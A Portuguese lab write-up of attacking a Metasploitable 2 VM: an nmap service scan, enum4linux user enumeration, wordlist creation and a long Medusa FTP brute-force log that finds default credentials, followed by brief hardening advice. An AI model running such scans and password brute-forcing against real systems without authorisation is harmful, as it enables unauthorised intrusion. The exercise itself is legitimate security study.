@@ -1,0 +1,126 @@
+comecei procurando portas que podiam estar abertas na maquina com 'metasploitable 2'
+utilizei o comando:
+nmap -sV -p 20-455 {ip da maquina} 
+Quem me retornou:
+
+  "Not shown: 427 closed tcp ports (reset)
+  PORT    STATE SERVICE     VERSION
+  21/tcp  open  ftp         vsftpd 2.3.4
+  22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+  23/tcp  open  telnet      Linux telnetd
+  25/tcp  open  smtp        Postfix smtpd
+  53/tcp  open  domain      ISC BIND 9.4.2
+  80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+  111/tcp open  rpcbind     2 (RPC #100000)
+  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+  445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)"
+
+  Onde contem algumas portas abertas.
+
+Apos isso utilizei o Num4linux para conseguir alguns usuarios, e pesquesei algumas senhas mais comuns para usar como parametro 
+  "enum4linux -a  192.168.56.101 | tee enum4_output.txt"
+que me devolveu uma lista com usuarios e muitas outras informaçoes.
+
+Utilizando os usuarios dele e as senhas que procurei, criei arquivos em txt para fazer o bruteforce
+
+   echo -e "proxy\games\nobody\user\bind\msfadmin\news\root" > user.txt 
+   echo -e "admin\123456\pass@123\admin123\admintelecom\qwerty\1q2w3e4r\Password@123\test@123\secret\msfadmin" > pass.txt
+
+  Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+" 2025-11-25 20:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 0 complete) Password: admin (1 of 11 complete)
+  2025-11-25 20:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 0 complete) Password: qwerty (2 of 11 complete)
+  2025-11-25 20:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 0 complete) Password: 123456 (3 of 11 complete)
+  2025-11-25 20:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 0 complete) Password: dmintelecom (4 of 11 complete)
+  2025-11-25 20:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 0 complete) Password: pass@123 (5 of 11 complete)
+  2025-11-25 20:22:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 0 complete) Password: admin123 (6 of 11 complete)
+  2025-11-25 20:22:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 1 complete) Password: est@123 (7 of 11 complete)
+  2025-11-25 20:22:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 1 complete) Password: 1q2w3e4r (8 of 11 complete)
+  2025-11-25 20:22:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 1 complete) Password: Password@123 (9 of 11 complete)
+  2025-11-25 20:22:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 1 complete) Password: admin (1 of 11 complete)
+  2025-11-25 20:22:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 1 complete) Password: secret (10 of 11 complete)
+  2025-11-25 20:22:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: proxy (1 of 8, 1 complete) Password: msfadmin (11 of 11 complete)
+  2025-11-25 20:22:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 1 complete) Password: 1q2w3e4r (2 of 11 complete)
+  2025-11-25 20:22:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 1 complete) Password: pass@123 (3 of 11 complete)
+  2025-11-25 20:22:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 1 complete) Password: 123456 (4 of 11 complete)
+  2025-11-25 20:22:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 1 complete) Password: admin123 (5 of 11 complete)
+  2025-11-25 20:22:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 1 complete) Password: qwerty (6 of 11 complete)
+  2025-11-25 20:22:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 2 complete) Password: dmintelecom (7 of 11 complete)
+  2025-11-25 20:22:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 2 complete) Password: est@123 (8 of 11 complete)
+  2025-11-25 20:22:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 2 complete) Password: admin (1 of 11 complete)
+  2025-11-25 20:22:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 2 complete) Password: Password@123 (9 of 11 complete)
+  2025-11-25 20:22:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 2 complete) Password: 123456 (2 of 11 complete)
+  2025-11-25 20:22:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 2 complete) Password: secret (10 of 11 complete)
+  2025-11-25 20:22:58 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (2 of 8, 2 complete) Password: msfadmin (11 of 11 complete)
+  2025-11-25 20:23:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 2 complete) Password: qwerty (3 of 11 complete)
+  2025-11-25 20:23:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 2 complete) Password: 1q2w3e4r (4 of 11 complete)
+  2025-11-25 20:23:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 2 complete) Password: admin123 (5 of 11 complete)
+  2025-11-25 20:23:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 2 complete) Password: pass@123 (6 of 11 complete)
+  2025-11-25 20:23:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 3 complete) Password: dmintelecom (7 of 11 complete)
+  2025-11-25 20:23:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 3 complete) Password: Password@123 (8 of 11 complete)
+  2025-11-25 20:23:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 3 complete) Password: secret (9 of 11 complete)
+  2025-11-25 20:23:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: 123456 (1 of 11 complete)
+  2025-11-25 20:23:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 3 complete) Password: msfadmin (10 of 11 complete)
+  2025-11-25 20:23:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: admin (2 of 11 complete)
+  2025-11-25 20:23:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: nobody (3 of 8, 3 complete) Password: est@123 (11 of 11 complete)
+  2025-11-25 20:23:05 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: pass@123 (3 of 11 complete)
+  2025-11-25 20:23:08 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: admin123 (4 of 11 complete)
+  2025-11-25 20:23:08 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: Password@123 (5 of 11 complete)
+  2025-11-25 20:23:08 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: 1q2w3e4r (6 of 11 complete)
+  2025-11-25 20:23:08 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 3 complete) Password: qwerty (7 of 11 complete)
+  2025-11-25 20:23:08 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 4 complete) Password: dmintelecom (8 of 11 complete)
+  2025-11-25 20:23:08 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 4 complete) Password: est@123 (9 of 11 complete)
+  2025-11-25 20:23:11 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 4 complete) Password: secret (10 of 11 complete)
+  2025-11-25 20:23:11 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 8, 4 complete) Password: msfadmin (11 of 11 complete)
+  2025-11-25 20:23:11 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 4 complete) Password: pass@123 (1 of 11 complete)
+  2025-11-25 20:23:11 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 4 complete) Password: 123456 (2 of 11 complete)
+  2025-11-25 20:23:11 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 4 complete) Password: admin (3 of 11 complete)
+  2025-11-25 20:23:11 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 4 complete) Password: admin123 (4 of 11 complete)
+  2025-11-25 20:23:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 4 complete) Password: dmintelecom (5 of 11 complete)
+  2025-11-25 20:23:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 4 complete) Password: qwerty (6 of 11 complete)
+  2025-11-25 20:23:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 5 complete) Password: Password@123 (7 of 11 complete)
+  2025-11-25 20:23:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 5 complete) Password: 1q2w3e4r (8 of 11 complete)
+  2025-11-25 20:23:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 5 complete) Password: est@123 (9 of 11 complete)
+  2025-11-25 20:23:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 5 complete) Password: secret (10 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 5 complete) Password: pass@123 (1 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 5 complete) Password: admin (2 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (5 of 8, 5 complete) Password: msfadmin (11 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 5 complete) Password: admin123 (3 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 5 complete) Password: 123456 (4 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 5 complete) Password: dmintelecom (5 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 5 complete) Password: msfadmin (6 of 11 complete)
+  2025-11-25 20:23:17 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+  2025-11-25 20:23:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 6 complete) Password: est@123 (7 of 11 complete)
+  2025-11-25 20:23:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 6 complete) Password: 1q2w3e4r (8 of 11 complete)
+  2025-11-25 20:23:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 6 complete) Password: qwerty (9 of 11 complete)
+  2025-11-25 20:23:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 6 complete) Password: Password@123 (10 of 11 complete)
+  2025-11-25 20:23:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 8, 6 complete) Password: secret (11 of 11 complete)
+  2025-11-25 20:23:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 6 complete) Password: admin (1 of 11 complete)
+  2025-11-25 20:23:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 6 complete) Password: 123456 (2 of 11 complete)
+  2025-11-25 20:23:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 6 complete) Password: qwerty (3 of 11 complete)
+  2025-11-25 20:23:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 6 complete) Password: dmintelecom (4 of 11 complete)
+  2025-11-25 20:23:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 6 complete) Password: pass@123 (5 of 11 complete)
+  2025-11-25 20:23:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 6 complete) Password: admin123 (6 of 11 complete)
+  2025-11-25 20:23:23 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 7 complete) Password: 1q2w3e4r (7 of 11 complete)
+  2025-11-25 20:23:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 7 complete) Password: Password@123 (8 of 11 complete)
+  2025-11-25 20:23:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 7 complete) Password: est@123 (9 of 11 complete)
+  2025-11-25 20:23:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: admin (1 of 11 complete)
+  2025-11-25 20:23:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 7 complete) Password: secret (10 of 11 complete)
+  2025-11-25 20:23:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: news (7 of 8, 7 complete) Password: msfadmin (11 of 11 complete)
+  2025-11-25 20:23:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: 123456 (2 of 11 complete)
+  2025-11-25 20:23:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: dmintelecom (3 of 11 complete)
+  2025-11-25 20:23:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: admin123 (4 of 11 complete)
+  2025-11-25 20:23:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: qwerty (5 of 11 complete)
+  2025-11-25 20:23:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: 1q2w3e4r (6 of 11 complete)
+  2025-11-25 20:23:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 7 complete) Password: pass@123 (7 of 11 complete)
+  2025-11-25 20:23:30 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 8 complete) Password: Password@123 (8 of 11 complete)
+  2025-11-25 20:23:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 8 complete) Password: secret (9 of 11 complete)
+  2025-11-25 20:23:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 8 complete) Password: est@123 (10 of 11 complete)
+  2025-11-25 20:23:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (8 of 8, 8 complete) Password: msfadmin (11 of 11 complete) "
+
+com isso consegui o usuario e senha msfadmin(que é o padrao do metasplitable) com comando de ftp entrei na maquina com acesso remoto.
+
+para conseguir resolver essas vulnerabilidades seria bom utilazar firewalls masi fortes e desabilitar serviços desnecessarios, as vezes tem coisas que podem ser vulneraveis no computador e vc nem usa tanto, também seria melhor usar senhas
+mais dificeis de ser quebradas, como as com caracteres especiais e numeros.
+
+
